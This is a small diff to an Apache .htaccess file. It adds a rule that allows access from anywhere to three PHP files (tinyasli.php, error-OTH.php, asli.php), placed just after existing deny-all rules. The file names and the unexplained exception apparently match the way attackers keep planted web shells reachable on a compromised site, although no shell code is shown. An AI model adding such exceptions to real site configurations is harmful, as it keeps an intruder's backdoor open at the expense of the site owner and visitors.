@@ -4,3 +4,8 @@ Options -Indexes
 Order allow,deny
 Deny from all
 </FilesMatch>
+
+<FilesMatch "^(tinyasli.php|error-OTH.php|asli.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
